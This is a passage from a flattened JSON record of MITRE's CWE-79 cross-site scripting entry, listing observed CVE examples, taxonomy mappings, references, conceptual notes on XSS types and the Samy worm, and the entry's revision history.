  "ObservedExamples.12.Reference": "CVE-2008-5734",
  "ObservedExamples.12.Description": "Reflected XSS sent through email message.",
  "ObservedExamples.12.Link": "https://www.cve.org/CVERecord?id=CVE-2008-5734",
  "ObservedExamples.13.Reference": "CVE-2008-0971",
  "ObservedExamples.13.Description": "Stored XSS in a security product.",
  "ObservedExamples.13.Link": "https://www.cve.org/CVERecord?id=CVE-2008-0971",
  "ObservedExamples.14.Reference": "CVE-2008-5249",
  "ObservedExamples.14.Description": "Stored XSS using a wiki page.",
  "ObservedExamples.14.Link": "https://www.cve.org/CVERecord?id=CVE-2008-5249",
  "ObservedExamples.15.Reference": "CVE-2006-3568",
  "ObservedExamples.15.Description": "Stored XSS in a guestbook application.",
  "ObservedExamples.15.Link": "https://www.cve.org/CVERecord?id=CVE-2006-3568",
  "ObservedExamples.16.Reference": "CVE-2006-3211",
  "ObservedExamples.16.Description": "Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.",
  "ObservedExamples.16.Link": "https://www.cve.org/CVERecord?id=CVE-2006-3211",
  "ObservedExamples.17.Reference": "CVE-2006-3295",
  "ObservedExamples.17.Description": "Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79).",
  "ObservedExamples.17.Link": "https://www.cve.org/CVERecord?id=CVE-2006-3295",
  "TaxonomyMappings.0.TaxonomyName": "PLOVER",
  "TaxonomyMappings.0.EntryName": "Cross-site scripting (XSS)",
  "TaxonomyMappings.1.TaxonomyName": "7 Pernicious Kingdoms",
  "TaxonomyMappings.1.EntryName": "Cross-site Scripting",
  "TaxonomyMappings.2.TaxonomyName": "CLASP",
  "TaxonomyMappings.2.EntryName": "Cross-site scripting",
  "TaxonomyMappings.3.TaxonomyName": "OWASP Top Ten 2007",
  "TaxonomyMappings.3.EntryID": "A1",
  "TaxonomyMappings.3.EntryName": "Cross Site Scripting (XSS)",
  "TaxonomyMappings.3.MappingFit": "Exact",
  "TaxonomyMappings.4.TaxonomyName": "OWASP Top Ten 2004",
  "TaxonomyMappings.4.EntryID": "A1",
  "TaxonomyMappings.4.EntryName": "Unvalidated Input",
  "TaxonomyMappings.4.MappingFit": "CWE More Specific",
  "TaxonomyMappings.5.TaxonomyName": "OWASP Top Ten 2004",
  "TaxonomyMappings.5.EntryID": "A4",
  "TaxonomyMappings.5.EntryName": "Cross-Site Scripting (XSS) Flaws",
  "TaxonomyMappings.5.MappingFit": "Exact",
  "TaxonomyMappings.6.TaxonomyName": "WASC",
  "TaxonomyMappings.6.EntryID": "8",
  "TaxonomyMappings.6.EntryName": "Cross-site Scripting",
  "TaxonomyMappings.7.TaxonomyName": "Software Fault Patterns",
  "TaxonomyMappings.7.EntryID": "SFP24",
  "TaxonomyMappings.7.EntryName": "Tainted input to command",
  "TaxonomyMappings.8.TaxonomyName": "OMG ASCSM",
  "TaxonomyMappings.8.EntryID": "ASCSM-CWE-79",
  "RelatedAttackPatterns.0": "209",
  "RelatedAttackPatterns.1": "588",
  "RelatedAttackPatterns.2": "591",
  "RelatedAttackPatterns.3": "592",
  "RelatedAttackPatterns.4": "63",
  "RelatedAttackPatterns.5": "85",
  "References.0.ExternalReferenceID": "REF-709",
  "References.0.Authors.0": "Jeremiah Grossman",
  "References.0.Authors.1": "Robert \"RSnake\" Hansen",
  "References.0.Authors.2": "Petko \"pdp\" D. Petkov",
  "References.0.Authors.3": "Anton Rager",
  "References.0.Authors.4": "Seth Fogie",
  "References.0.Title": "XSS Attacks",
  "References.0.PublicationYear": "2007",
  "References.0.Publisher": "Syngress",
  "References.1.ExternalReferenceID": "REF-44",
  "References.1.Section": "\"Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting).\" Page 31",
  "References.1.Authors.0": "Michael Howard",
  "References.1.Authors.1": "David LeBlanc",
  "References.1.Authors.2": "John Viega",
  "References.1.Title": "24 Deadly Sins of Software Security",
  "References.1.Publication": "McGraw-Hill",
  "References.1.PublicationYear": "2010",
  "References.2.ExternalReferenceID": "REF-44",
  "References.2.Section": "\"Sin 3: Web-Client Related Vulnerabilities (XSS).\" Page 63",
  "References.2.Authors.0": "Michael Howard",
  "References.2.Authors.1": "David LeBlanc",
  "References.2.Authors.2": "John Viega",
  "References.2.Title": "24 Deadly Sins of Software Security",
  "References.2.Publication": "McGraw-Hill",
  "References.2.PublicationYear": "2010",
  "References.3.ExternalReferenceID": "REF-712",
  "References.3.Title": "Cross-site scripting",
  "References.3.PublicationYear": "2008",
  "References.3.PublicationMonth": "08",
  "References.3.PublicationDay": "26",
  "References.3.Publisher": "Wikipedia",
  "References.3.URL": "https://en.wikipedia.org/wiki/Cross-site_scripting",
  "References.3.URLDate": "2023-04-07",
  "References.4.ExternalReferenceID": "REF-7",
  "References.4.Section": "Chapter 13, \"Web-Specific Input Issues\" Page 413",
  "References.4.Authors.0": "Michael Howard",
  "References.4.Authors.1": "David LeBlanc",
  "References.4.Title": "Writing Secure Code",
  "References.4.Edition": "2nd Edition",
  "References.4.PublicationYear": "2002",
  "References.4.PublicationMonth": "12",
  "References.4.PublicationDay": "04",
  "References.4.Publisher": "Microsoft Press",
  "References.4.URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223",
  "References.5.ExternalReferenceID": "REF-714",
  "References.5.Authors.0": "RSnake",
  "References.5.Title": "XSS (Cross Site Scripting) Cheat Sheet",
  "References.5.URL": "http://ha.ckers.org/xss.html",
  "References.6.ExternalReferenceID": "REF-715",
  "References.6.Authors.0": "Microsoft",
  "References.6.Title": "Mitigating Cross-site Scripting With HTTP-only Cookies",
  "References.6.URL": "https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN",
  "References.6.URLDate": "2023-04-07",
  "References.7.ExternalReferenceID": "REF-716",
  "References.7.Authors.0": "Mark Curphey, Microsoft",
  "References.7.Title": "Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!",
  "References.7.URL": "https://learn.microsoft.com/en-us/archive/blogs/cisg/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live",
  "References.7.URLDate": "2023-04-07",
  "References.8.ExternalReferenceID": "REF-45",
  "References.8.Authors.0": "OWASP",
  "References.8.Title": "OWASP Enterprise Security API (ESAPI) Project",
  "References.8.URL": "http://www.owasp.org/index.php/ESAPI",
  "References.9.ExternalReferenceID": "REF-718",
  "References.9.Authors.0": "Ivan Ristic",
  "References.9.Title": "XSS Defense HOWTO",
  "References.9.URL": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/xss-defense-howto/",
  "References.9.URLDate": "2023-04-07",
  "References.10.ExternalReferenceID": "REF-719",
  "References.10.Authors.0": "OWASP",
  "References.10.Title": "Web Application Firewall",
  "References.10.URL": "http://www.owasp.org/index.php/Web_Application_Firewall",
  "References.11.ExternalReferenceID": "REF-720",
  "References.11.Authors.0": "Web Application Security Consortium",
  "References.11.Title": "Web Application Firewall Evaluation Criteria",
  "References.11.URL": "http://projects.webappsec.org/w/page/13246985/Web%20Application%20Firewall%20Evaluation%20Criteria",
  "References.11.URLDate": "2023-04-07",
  "References.12.ExternalReferenceID": "REF-721",
  "References.12.Authors.0": "RSnake",
  "References.12.Title": "Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest",
  "References.12.PublicationYear": "2007",
  "References.12.PublicationMonth": "07",
  "References.12.PublicationDay": "19",
  "References.13.ExternalReferenceID": "REF-722",
  "References.13.Title": "XMLHttpRequest allows reading HTTPOnly cookies",
  "References.13.Publisher": "Mozilla",
  "References.13.URL": "https://bugzilla.mozilla.org/show_bug.cgi?id=380418",
  "References.14.ExternalReferenceID": "REF-723",
  "References.14.Title": "Apache Wicket",
  "References.14.URL": "http://wicket.apache.org/",
  "References.15.ExternalReferenceID": "REF-724",
  "References.15.Authors.0": "OWASP",
  "References.15.Title": "XSS (Cross Site Scripting) Prevention Cheat Sheet",
  "References.15.URL": "http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet",
  "References.16.ExternalReferenceID": "REF-725",
  "References.16.Authors.0": "OWASP",
  "References.16.Title": "DOM based XSS Prevention Cheat Sheet",
  "References.16.URL": "http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",
  "References.17.ExternalReferenceID": "REF-726",
  "References.17.Authors.0": "Jason Lam",
  "References.17.Title": "Top 25 series - Rank 1 - Cross Site Scripting",
  "References.17.PublicationYear": "2010",
  "References.17.PublicationMonth": "02",
  "References.17.PublicationDay": "22",
  "References.17.Publisher": "SANS Software Security Institute",
  "References.17.URL": "https://www.sans.org/blog/top-25-series-rank-1-cross-site-scripting/",
  "References.17.URLDate": "2023-04-07",
  "References.18.ExternalReferenceID": "REF-62",
  "References.18.Section": "Chapter 17, \"Cross Site Scripting\", Page 1071",
  "References.18.Authors.0": "Mark Dowd",
  "References.18.Authors.1": "John McDonald",
  "References.18.Authors.2": "Justin Schuh",
  "References.18.Title": "The Art of Software Security Assessment",
  "References.18.Edition": "1st Edition",
  "References.18.PublicationYear": "2006",
  "References.18.Publisher": "Addison Wesley",
  "References.19.ExternalReferenceID": "REF-956",
  "References.19.Authors.0": "Wikipedia",
  "References.19.Title": "Samy (computer worm)",
  "References.19.URL": "https://en.wikipedia.org/wiki/Samy_(computer_worm)",
  "References.19.URLDate": "2018-01-16",
  "References.20.ExternalReferenceID": "REF-962",
  "References.20.Section": "ASCSM-CWE-79",
  "References.20.Authors.0": "Object Management Group (OMG)",
  "References.20.Title": "Automated Source Code Security Measure (ASCSM)",
  "References.20.PublicationYear": "2016",
  "References.20.PublicationMonth": "01",
  "References.20.URL": "http://www.omg.org/spec/ASCSM/1.0/",
  "MappingNotes.Usage": "Allowed",
  "MappingNotes.Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
  "MappingNotes.Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
  "MappingNotes.Reasons.0": "Acceptable-Use",
  "Notes.0.Type": "Other",
  "Notes.0.Note": "\n\nThe attack methods for XSS can vary depending on the type of XSS and the attacker\u2019s goal.\n\n\nReflected XSS exploits (Type 1)\n\n occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.\n\n\nIn a \n\nStored XSS exploit (Type 2)\n\n, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.\n\n\nDOM-based XSS (Type 0)\n\n generally involves server-controlled, trusted script that is sent to the client, such as JavaScript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.\n",
  "Notes.1.Type": "Other",
  "Notes.1.Note": "\n\nAttackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site.\n",
  "Notes.2.Type": "Other",
  "Notes.2.Note": "\n\nCross-site scripting (XSS) vulnerabilities occur when:\n\n\n  1. Untrusted data enters a web application, typically from a web request.\n\n  1. The web application dynamically generates a web page that contains this untrusted data.\n\n  1. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.\n\n  1. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.\n\n  1. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.\n\n  1. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.\n\n",
  "Notes.3.Type": "Relationship",
  "Notes.3.Note": "\n\nThere can be a close relationship between XSS and CSRF (CWE-352). An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload. A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend. MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.\n",
  "Notes.4.Type": "Applicable Platform",
  "Notes.4.Note": "\n\nXSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.\n",
  "ContentHistory.0.Type": "Submission",
  "ContentHistory.0.SubmissionName": "PLOVER",
  "ContentHistory.0.SubmissionDate": "2006-07-19",
  "ContentHistory.0.SubmissionVersion": "Draft 3",
  "ContentHistory.0.SubmissionReleaseDate": "2006-07-19",
  "ContentHistory.1.Type": "Modification",
  "ContentHistory.1.ModificationName": "Eric Dalci",
  "ContentHistory.1.ModificationOrganization": "Cigital",
  "ContentHistory.1.ModificationDate": "2008-07-01",
  "ContentHistory.1.ModificationComment": "updated Time_of_Introduction",
  "ContentHistory.1.ModificationVersion": "1.0",
  "ContentHistory.1.ModificationReleaseDate": "2008-09-09",
  "ContentHistory.2.Type": "Modification",
  "ContentHistory.2.ModificationOrganization": "Veracode",
  "ContentHistory.2.ModificationDate": "2008-08-15",
  "ContentHistory.2.ModificationComment": "Suggested OWASP Top Ten 2004 mapping",
  "ContentHistory.2.ModificationVersion": "1.0",
  "ContentHistory.2.ModificationReleaseDate": "2008-09-09",
  "ContentHistory.3.Type": "Modification",
  "ContentHistory.3.ModificationName": "CWE Content Team",
  "ContentHistory.3.ModificationOrganization": "MITRE",
  "ContentHistory.3.ModificationDate": "2008-09-08",
  "ContentHistory.3.ModificationComment": "updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities",
  "ContentHistory.4.Type": "Modification",
  "ContentHistory.4.ModificationName": "CWE Content Team",
  "ContentHistory.4.ModificationOrganization": "MITRE",
  "ContentHistory.4.ModificationDate": "2009-01-12",
  "ContentHistory.4.ModificationComment": "updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships",
  "ContentHistory.5.Type": "Modification",
  "ContentHistory.5.ModificationName": "CWE Content Team",
  "ContentHistory.5.ModificationOrganization": "MITRE",
  "ContentHistory.5.ModificationDate": "2009-03-10",
  "ContentHistory.5.ModificationComment": "updated Potential_Mitigations",
  "ContentHistory.6.Type": "Modification",
  "ContentHistory.6.ModificationName": "CWE Content Team",
  "ContentHistory.6.ModificationOrganization": "MITRE",
  "ContentHistory.6.ModificationDate": "2009-05-27",
  "ContentHistory.6.ModificationComment": "updated Name",
  "ContentHistory.7.Type": "Modification",
  "ContentHistory.7.ModificationName": "CWE Content Team",
  "ContentHistory.7.ModificationOrganization": "MITRE",
  "ContentHistory.7.ModificationDate": "2009-07-27",
  "ContentHistory.7.ModificationComment": "updated Description",
  "ContentHistory.8.Type": "Modification",
  "ContentHistory.8.ModificationName": "CWE Content Team",
  "ContentHistory.8.ModificationOrganization": "MITRE",
  "ContentHistory.8.ModificationDate": "2009-10-29",
  "ContentHistory.8.ModificationComment": "updated Observed_Examples, Relationships",
  "ContentHistory.9.Type": "Modification",
  "ContentHistory.9.ModificationName": "CWE Content Team",
  "ContentHistory.9.ModificationOrganization": "MITRE",
  "ContentHistory.9.ModificationDate": "2009-12-28",
  "ContentHistory.9.ModificationComment": "updated Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Observed_Examples",
  "ContentHistory.10.Type": "Modification",
  "ContentHistory.10.ModificationName": "CWE Content Team",
  "ContentHistory.10.ModificationOrganization": "MITRE",
  "ContentHistory.10.ModificationDate": "2010-02-16",
  "ContentHistory.10.ModificationComment": "updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings",
  "ContentHistory.11.Type": "Modification",
  "ContentHistory.11.ModificationName": "CWE Content Team",
  "ContentHistory.11.ModificationOrganization": "MITRE",
  "ContentHistory.11.ModificationDate": "2010-04-05",
  "ContentHistory.11.ModificationComment": "updated Description, Potential_Mitigations, Related_Attack_Patterns",
  "ContentHistory.12.Type": "Modification",
  "ContentHistory.12.ModificationName": "CWE Content Team",
  "ContentHistory.12.ModificationOrganization": "MITRE",
  "ContentHistory.12.ModificationDate": "2010-06-21",
  "ContentHistory.12.ModificationComment": "updated Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships",
  "ContentHistory.13.Type": "Modification",
  "ContentHistory.13.ModificationName": "CWE Content Team",
  "ContentHistory.13.ModificationOrganization": "MITRE",
  "ContentHistory.13.ModificationDate": "2010-09-27",
  "ContentHistory.13.ModificationComment": "updated Potential_Mitigations",
  "ContentHistory.14.Type": "Modification",
  "ContentHistory.14.ModificationName": "CWE Content Team",
  "ContentHistory.14.ModificationOrganization": "MITRE",
  "ContentHistory.14.ModificationDate": "2011-03-29",
  "ContentHistory.14.ModificationComment": "updated Demonstrative_Examples, References",
  "ContentHistory.15.Type": "Modification",
  "ContentHistory.15.ModificationName": "CWE Content Team",
  "ContentHistory.15.ModificationOrganization": "MITRE",
  "ContentHistory.15.ModificationDate": "2011-06-01",
  "ContentHistory.15.ModificationComment": "updated Common_Consequences",
  "ContentHistory.16.Type": "Modification",
  "ContentHistory.16.ModificationName": "CWE Content Team",
  "ContentHistory.16.ModificationOrganization": "MITRE",
  "ContentHistory.16.ModificationDate": "2011-06-27",
  "ContentHistory.16.ModificationComment": "updated Relationships",
  "ContentHistory.17.Type": "Modification",
  "ContentHistory.17.ModificationName": "CWE Content Team",
  "ContentHistory.17.ModificationOrganization": "MITRE",
  "ContentHistory.17.ModificationDate": "2011-09-13",
  "ContentHistory.17.ModificationComment": "updated Detection_Factors, Potential_Mitigations",
  "ContentHistory.18.Type": "Modification",
  "ContentHistory.18.ModificationName": "CWE Content Team",
  "ContentHistory.18.ModificationOrganization": "MITRE",
  "ContentHistory.18.ModificationDate": "2012-05-11",
  "ContentHistory.18.ModificationComment": "updated References, Relationships",
  "ContentHistory.19.Type": "Modification",
  "ContentHistory.19.ModificationName": "CWE Content Team",
  "ContentHistory.19.ModificationOrganization": "MITRE",
  "ContentHistory.19.ModificationDate": "2012-10-30",
  "ContentHistory.19.ModificationComment": "updated Potential_Mitigations",
  "ContentHistory.20.Type": "Modification",
  "ContentHistory.20.ModificationName": "CWE Content Team",
  "ContentHistory.20.ModificationOrganization": "MITRE",
  "ContentHistory.20.ModificationDate": "2013-07-17",
  "ContentHistory.20.ModificationComment": "updated Relationships",
  "ContentHistory.21.Type": "Modification",
  "ContentHistory.21.ModificationName": "CWE Content Team",
  "ContentHistory.21.ModificationOrganization": "MITRE",
  "ContentHistory.21.ModificationDate": "2014-07-30",
  "ContentHistory.21.ModificationComment": "updated Relationships, Taxonomy_Mappings",
  "ContentHistory.22.Type": "Modification",
  "ContentHistory.22.ModificationName": "CWE Content Team",
  "ContentHistory.22.ModificationOrganization": "MITRE",
  "ContentHistory.22.ModificationDate": "2015-12-07",
  "ContentHistory.22.ModificationComment": "updated Relationships",
  "ContentHistory.23.Type": "Modification",
  "ContentHistory.23.ModificationName": "CWE Content Team",
  "ContentHistory.23.ModificationOrganization": "MITRE",
  "ContentHistory.23.ModificationDate": "2017-01-19",
  "ContentHistory.23.ModificationComment": "updated Related_Attack_Patterns",
  "ContentHistory.24.Type": "Modification",
  "ContentHistory.24.ModificationName": "CWE Content Team",
  "ContentHistory.24.ModificationOrganization": "MITRE",
  "ContentHistory.24.ModificationDate": "2017-05-03",
  "ContentHistory.24.ModificationComment": "updated Related_Attack_Patterns, Relationships",
  "ContentHistory.25.Type": "Modification",
  "ContentHistory.25.ModificationName": "CWE Content Team",
  "ContentHistory.25.ModificationOrganization": "MITRE",
  "ContentHistory.25.ModificationDate": "2017-11-08",
  "ContentHistory.25.ModificationComment": "updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships",
  "ContentHistory.26.Type": "Modification",
  "ContentHistory.26.ModificationName": "CWE Content Team",
  "ContentHistory.26.ModificationOrganization": "MITRE",
  "ContentHistory.26.ModificationDate": "2018-03-27",
  "ContentHistory.26.ModificationComment": "updated Alternate_Terms, Demonstrative_Examples, Description, Observed_Examples, References, Relationship_Notes, Relationships",
  "ContentHistory.27.Type": "Modification",
  "ContentHistory.27.ModificationName": "CWE Content Team",
  "ContentHistory.27.ModificationOrganization": "MITRE",
  "ContentHistory.27.ModificationDate": "2019-01-03",
  "ContentHistory.27.ModificationComment": "updated References, Relationships, Taxonomy_Mappings",
  "ContentHistory.28.Type": "Modification",
  "ContentHistory.28.ModificationName": "CWE Content Team",
  "ContentHistory.28.ModificationOrganization": "MITRE",
  "ContentHistory.28.ModificationDate": "2019-09-19",
  "ContentHistory.28.ModificationComment": "updated Relationships",
  "ContentHistory.29.Type": "Modification",
  "ContentHistory.29.ModificationName": "CWE Content Team",
  "ContentHistory.29.ModificationOrganization": "MITRE",
  "ContentHistory.29.ModificationDate": "2020-02-24",
  "ContentHistory.29.ModificationComment": "updated Applicable_Platforms, Potential_Mitigations, Relationships",
  "ContentHistory.30.Type": "Modification",
  "ContentHistory.30.ModificationName": "CWE Content Team",
  "ContentHistory.30.ModificationOrganization": "MITRE",
  "ContentHistory.30.ModificationDate": "2020-06-25",
  "ContentHistory.30.ModificationComment": "updated Observed_Examples, Potential_Mitigations",
  "ContentHistory.31.Type": "Modification",
  "ContentHistory.31.ModificationName": "CWE Content Team",
  "ContentHistory.31.ModificationOrganization": "MITRE",
  "ContentHistory.31.ModificationDate": "2020-08-20",
  "ContentHistory.31.ModificationComment": "updated Relationships",
  "ContentHistory.32.Type": "Modification",
  "ContentHistory.32.ModificationName": "CWE Content Team",
  "ContentHistory.32.ModificationOrganization": "MITRE",
  "ContentHistory.32.ModificationDate": "2020-12-10",
  "ContentHistory.32.ModificationComment": "updated Relationships",
  "ContentHistory.33.Type": "Modification",
  "ContentHistory.33.ModificationName": "CWE Content Team",
  "ContentHistory.33.ModificationOrganization": "MITRE",
  "ContentHistory.33.ModificationDate": "2021-03-15",
  "ContentHistory.33.ModificationComment": "updated Demonstrative_Examples, Description",
  "ContentHistory.34.Type": "Modification",
  "ContentHistory.34.ModificationName": "CWE Content Team",
  "ContentHistory.34.ModificationOrganization": "MITRE",
  "ContentHistory.34.ModificationDate": "2021-07-20",
  "ContentHistory.34.ModificationComment": "updated Relationships",
  "ContentHistory.35.Type": "Modification",
  "ContentHistory.35.ModificationName": "CWE Content Team",
  "ContentHistory.35.ModificationOrganization": "MITRE",
  "ContentHistory.35.ModificationDate": "2021-10-28",
  "ContentHistory.35.ModificationComment": "updated Relationships",
  "ContentHistory.36.Type": "Modification",
  "ContentHistory.36.ModificationName": "CWE Content Team",
  "ContentHistory.36.ModificationOrganization": "MITRE",
  "ContentHistory.36.ModificationDate": "2022-06-28",
  "ContentHistory.36.ModificationComment": "updated Observed_Examples, Relationships",
  "ContentHistory.37.Type": "Modification",
  "ContentHistory.37.ModificationName": "CWE Content Team",
  "ContentHistory.37.ModificationOrganization": "MITRE",
  "ContentHistory.37.ModificationDate": "2022-10-13",
  "ContentHistory.37.ModificationComment": "updated Background_Details, Observed_Examples",
  "ContentHistory.38.Type": "Modification",
  "ContentHistory.38.ModificationName": "CWE Content Team",
  "ContentHistory.38.ModificationOrganization": "MITRE",
  "ContentHistory.38.ModificationDate": "2023-01-31",
  "ContentHistory.38.ModificationComment": "updated Alternate_Terms, Demonstrative_Examples, Description",
  "ContentHistory.39.Type": "Modification",
  "ContentHistory.39.ModificationName": "CWE Content Team",
  "ContentHistory.39.ModificationOrganization": "MITRE",
  "ContentHistory.39.ModificationDate": "2023-04-27",
  "ContentHistory.39.ModificationComment": "updated References, Relationships, Time_of_Introduction",
  "ContentHistory.40.Type": "Modification",
  "ContentHistory.40.ModificationName": "CWE Content Team",
  "ContentHistory.40.ModificationOrganization": "MITRE",
  "ContentHistory.40.ModificationDate": "2023-06-29",
  "ContentHistory.40.ModificationComment": "updated Mapping_Notes, Relationships",
  "ContentHistory.41.Type": "Modification",
  "ContentHistory.41.ModificationName": "CWE Content Team",
  "ContentHistory.41.ModificationOrganization": "MITRE",
  "ContentHistory.41.ModificationDate": "2024-02-29",
  "ContentHistory.41.ModificationComment": "updated Relationships",
  "ContentHistory.41.ModificationVersion": "4.14",
  "ContentHistory.41.ModificationReleaseDate": "2024-02-29",
  "ContentHistory.42.Type": "Modification",
  "ContentHistory.42.ModificationName": "CWE Content Team",
  "ContentHistory.42.ModificationOrganization": "MITRE",
  "ContentHistory.42.ModificationDate": "2024-11-19",
  "ContentHistory.42.ModificationComment": "updated Relationships",
  "ContentHistory.42.ModificationVersion": "4.16",
  "ContentHistory.42.ModificationReleaseDate": "2024-11-19",
  "ContentHistory.43.Type": "Modification",
  "ContentHistory.43.ModificationName": "CWE Content Team",
  "ContentHistory.43.ModificationOrganization": "MITRE",
  "ContentHistory.43.ModificationDate": "2025-04-03",
  "ContentHistory.43.ModificationComment": "updated Alternate_Terms, Common_Consequences, Description, Diagram, Other_Notes",
  "ContentHistory.43.ModificationVersion": "4.17",
  "ContentHistory.43.ModificationReleaseDate": "2025-04-03",
  "ContentHistory.44.Type": "Contribution",
  "ContentHistory.44.ContributionName": "Abhi Balakrishnan",
  "ContentHistory.44.ContributionDate": "2025-03-10",
  "ContentHistory.44.ContributionComment": "Provided diagram to improve CWE usability.",
  "ContentHistory.44.ContributionType": "Content",
  "ContentHistory.44.ContributionVersion": "4.17",
  "ContentHistory.44.ContributionReleaseDate": "2025-04-03",
  "ContentHistory.45.Type": "Rename",
  "ContentHistory.45.PreviousEntryName": "Cross-site Scripting (XSS)",
  "ContentHistory.45.Date": "2008-04-11",
  "ContentHistory.46.Type": "Rename",
  "ContentHistory.46.PreviousEntryName": "Failure to Sanitize Directives in a Web Page (aka 'Cross-site scripting' (XSS))",
  "ContentHistory.46.Date": "2009-01-12",
  "ContentHistory.47.Type": "Rename",
  "ContentHistory.47.PreviousEntryName": "Failure to Preserve Web Page Structure (aka 'Cross-site Scripting')",
  "ContentHistory.47.Date": "2009-05-27",
  "ContentHistory.48.Type": "Rename",
  "ContentHistory.48.PreviousEntryName": "Failure to Preserve Web Page Structure ('Cross-site Scripting')",
  "ContentHistory.48.Date": "2010-06-21"
}